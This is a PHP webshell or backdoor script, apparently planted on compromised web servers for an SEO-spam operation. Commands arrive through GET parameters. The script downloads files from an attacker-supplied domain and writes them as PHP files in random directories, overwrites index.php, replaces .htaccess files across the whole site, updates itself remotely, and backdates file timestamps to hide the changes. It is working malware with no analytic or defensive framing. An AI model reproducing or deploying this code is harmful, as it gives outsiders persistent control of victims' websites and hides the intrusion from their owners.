<?php 
	error_reporting(0);
	define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));
	function get_contents($url){ 
		$contents = @file_get_contents($url);
		if (!$contents) {
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
			$contents = curl_exec($ch);
			curl_close($ch);
		} 
		return $contents;
	}
	function check_remote_file_exists($url) {
		$curl = curl_init($url);
		curl_setopt($curl, CURLOPT_NOBODY, true);
		curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'GET');
		$result = curl_exec($curl);
		$found = false;
		if ($result !== false) {
			$statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
			if ($statusCode == 200) {
				$found = true;
			}
		}
		curl_close($curl);
		return $found;
	}
	function copyfiles($file1,$file2){
		$contentx =@get_contents($file1);
	 	$openedfile = @fopen($file2, "w");
	 	@fwrite($openedfile, $contentx);
	 	@fclose($openedfile);
		if ($contentx === FALSE) {
	  		$status=false;
		}else $status=true;
	  	return $status;
 	}
	function read_dir_queue($dir,$level=5){
		$files=array();
		$files1=array();
		$queue=array($dir);
		while(@$data=each($queue)){
			$path=$data['value'];
			if(@is_dir($path) && @$handle=@opendir($path)){
				while($file=@readdir($handle)){
					$path3 = str_replace($_SERVER['DOCUMENT_ROOT'],"",$path);
					$path4 = explode("/",$path3);
					if(count($path4)>($level+1)){ break 2; }
					if($file=='.'||$file=='..'||strstr($file, "wp-content/upload")||strstr($file, ".php")) continue;
					$files[] = $real_path=$path.'/'.$file;
					if (is_dir($real_path)) $queue[] = $real_path;
				}
			}
			@closedir($handle);
		}
		return $files;
	}
	function rpath_arry($dir){
		$files=array();
		$queue=array($dir);
		while(@$data=each($queue)){
			$path=$data['value'];
			if(@is_dir($path) && @$handle=@opendir($path)){
				while($file=@readdir($handle)){
					$path3 = str_replace($_SERVER['DOCUMENT_ROOT'],"",$path);
					$path4 = explode("/",$path3);
					if($file=='.'||$file=='..') continue;
					$files[] = $real_path=$path.'/'.$file;
					if (is_dir($real_path)) $queue[] = $real_path;
				}
			}
			@closedir($handle);
		}
		return $files;
	}
	function dir_size1($dir3,$url){
		$dh = @opendir($dir3);
		$return = array();
		while($file = @readdir($dh)){
			if($file!='.' and $file!='..'){
				$filetime[] = date("Y-m-d H:i:s",filemtime($file));
			}
		  }  
		  @closedir($dh);
		  @array_multisort($filetime);
		  return $filetime;
	}
	$http1="http://";
	if(@$_SERVER["HTTPS"] == "on") {
		$http1="https://";
	}
	$sig=@$_GET['sig'];
	@$domain_2020='http://'.$_GET['domain'];
	if($sig=='beima'){
		$level = $_GET['level'];
		$create_path1 = $_SERVER['DOCUMENT_ROOT'];
		if($level > 0){
			$aPathes = @read_dir_queue($_SERVER['DOCUMENT_ROOT'],$level);
			function getDepth($sPath) {
				return substr_count($sPath, '/');
			}
			$aPathDepths = array_map('getDepth', $aPathes);
			arsort($aPathDepths);
			$arry1=array();
			$flag = current($aPathDepths)>=$level?true:false;
			foreach ($aPathDepths as $iKey => $iDepth) {
				$arry11 = str_replace(strtolower($_SERVER['DOCUMENT_ROOT']),"",strtolower($aPathes[$iKey]));
				$arry11 = dirname($arry11);
				$arry22 = explode("/",$arry11);
				if(count($arry22)==$level){
					$arry1[] = dirname($aPathes[$iKey]);
				}elseif(!$flag){
					$arry1[] = dirname($aPathes[$iKey]);
					break;
				}
			}
			$arry2= array_unique($arry1);
			shuffle($arry2);
			$rndKey = array_rand($arry2);
			$create_path1 = $arry2[$rndKey];
		}
		$shell_file = $_GET['shell_file'];
		$shell_source5 = $domain_2020."/".$shell_file.".html";
		if(check_remote_file_exists($shell_source5) && $_GET['file_name']!=""){
			$file_name = $_GET['file_name'];
			if($file_name!=""){
				$shell_end5 = $create_path1.'/'.$file_name;
			}else{
				$shell_end5 = $create_path1.'/style.php';
			}
			if(copyfiles($shell_source5,$shell_end5)){
				if(!file_exists($shell_end5))
				{
					echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
					exit;
				}
				$time3=@dir_size1($shell_end5,'');
				$time4=strtotime($time3[0]);
				touch($shell_end5,$time4);
				$shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
				echo $shell_end6; 
			}
		}
		exit;
	}else if($sig=='jc_index'){
		$shell_file = $_GET['shell_file'];
		$file_path= BASE_PATH.'/index.php';
		$file_path1 = $domain_2020.'/'.$shell_file.'.html';
		$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
		$str=@file_get_contents($file_path);
		if(file_exists($file_path)){
			if(check_remote_file_exists($file_path1)){
				$str1=@get_contents($file_path1);
				$shell_content3 = "";
				if(file_exists(BASE_PATH."/wp-content/themes")){
					$shell_content3 = "<?php define('WP_USE_THEMES',true);require __DIR__.'/wp-blog-header.php';";
				}else{
					$shell_content1=  $str;
					$shell_content2 = explode('?>',$shell_content1);
					$shell_content3 = $shell_content1;
					for($i=0;$i<count($shell_content2);$i++){
						if(strpos($shell_content2[$i],'base64_decode(') !== false || strpos($shell_content2[$i],'urldecode(') !== false || strpos($shell_content2[$i],'O00__0OOO_') !== false || strpos($shell_content2[$i],'yumingid') !== false || strpos($shell_content2[$i],'urlgz=') !== false || strpos($shell_content2[$i],'O0O_0O_O_0') !== false || strpos($shell_content2[$i],'wp-admin') !== false || strpos($shell_content2[$i],'ignore_user_abort') !== false || strpos($shell_content2[$i],'HTTP_REFERER') !== false || strpos($shell_content2[$i],'sitemap') !== false || strpos($shell_content2[$i],'$x(') !== false || strpos($shell_content2[$i],'$_GET["3x"]') !== false || strpos($shell_content2[$i],'error_reporting') !== false || strpos($shell_content2[$i],'ini_set(') !== false || strpos($shell_content2[$i],'ini_set(') !== false){
							$shell_content3=str_replace($shell_content2[$i]."?>","",$shell_content3);
						}
					}
				}
				@chmod($file_path,0755);
				$result_unlink=unlink($file_path);
				if($result_unlink){
					if(file_put_contents($file_path, $str1.$shell_content3)){
						$time3=dir_size1(dirname(__FILE__),'');
						$time4=strtotime($time3[0]);
						touch(dirname(__FILE__).'/'.basename(__FILE__),$time4);
						touch($file_path,$time4);
						echo $tishi.'|index.php write success!';
					}else{
						echo $tishi.'|index.php write fail!';
					}
				}
			}
		}else{
			if(check_remote_file_exists($file_path1)){
				@chmod($file_path,0755);
				if(copyfiles($file_path1,$file_path)){
					$time3=dir_size1(dirname(__FILE__),'');
					$time4=strtotime($time3[0]);
					touch(dirname(__FILE__).'/'.basename(__FILE__),$time4);
					touch($file_path,$time4);
					echo $tishi.'|index.php write success!';
				}else{
					echo $tishi.'|index.php write fail!';
				}
			}
		}
		exit;
	}else if($sig=='change_hta'){
		$shell_source5 = $domain_2020."/htaccess.html";
		$str7=@get_contents($shell_source5);
		if(strpos($str7,'<FilesMatch') !== false){	
			$file_htaccess = BASE_PATH.'/.htaccess';
			$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
			
			if(file_exists($file_htaccess)){
				$result_unlink=unlink($file_htaccess);
				if($result_unlink){
					if(copyfiles($shell_source5,$file_htaccess)){
						echo $tishi.'|.htaccess write success!';
					}else{
						echo $tishi.'|.htaccess write fail!';
					}
				}else{
					if(copyfiles($shell_source5,$file_htaccess)){
						echo $tishi.'|.htaccess write success!';
					}else{
						echo $tishi.'|.htaccess write fail!';
					}
				}
			}else{
				if(copyfiles($shell_source5,$file_htaccess)){
					echo $tishi.'|.htaccess write success!';
				}else{
					echo $tishi.'|.htaccess write fail!';
				}
			}
		}else{
			echo $tishi.'|htaccess.html file dont exist or the content is wrong!';
		}
		exit;
	}else if($sig=='change_hta_all'){
		$shell_source5 = $domain_2020."/htaccess.html";
		$str7=@get_contents($shell_source5);
		if(strpos($str7,'<FilesMatch') !== false){
			$file_htaccess = BASE_PATH.'/.htaccess';
			$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
			if(file_exists($file_htaccess)){
				$result_unlink=unlink($file_htaccess);
				if($result_unlink){
					if(copyfiles($shell_source5,$file_htaccess)){
						echo $tishi.'|.htaccess write success!';
					}else{
						echo $tishi.'|.htaccess write fail!';
					}
				}else{
					if(copyfiles($shell_source5,$file_htaccess)){
						echo $tishi.'|.htaccess write success!';
					}else{
						echo $tishi.'|.htaccess write fail!';
					}
				}
			}else{
				if(copyfiles($shell_source5,$file_htaccess)){
					echo $tishi.'|.htaccess write success!';
				}else{
					echo $tishi.'|.htaccess write fail!';
				}
			}
			
			$files1 = @rpath_arry($_SERVER['DOCUMENT_ROOT']);
			$files2 =array();
			for($k=0;$k<count($files1);$k++){
				$files2[]=dirname($files1[$k]);
			}
			$files3=array();
			$files3 =array_filter(array_unique($files2));
			foreach ($files3 as $key=>$value){
				if( $files3[$key]!= BASE_PATH){
					$file_htaccess1 = $files3[$key].'/.htaccess';
					copyfiles($shell_source5,$file_htaccess1);
				}
			}
		}else{
			echo $tishi.'|htaccess.html file dont exist or the content is wrong!';
		}
		exit;
	}else if($sig=='update'){
		$style_2020=$domain_2020.'/style_2020.html';
		$file_style=__FILE__;
		if(check_remote_file_exists($style_2020)){
			$str7=@get_contents($style_2020);
			if(strpos($str7,'domain_2020') !== false){
				$tishi = $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
				if(copyfiles($style_2020,$file_style)){
					$time3=@dir_size1(dirname(__FILE__),'');
					$time4=strtotime($time3[0]);
					touch($file_style,$time4);
					echo $tishi.'--update success!';
				}else{
					echo $tishi.'--update fail!';
				}
			}	
		}
		exit;
	}
	exit("<h1>itsjsj401code</h1>");
?>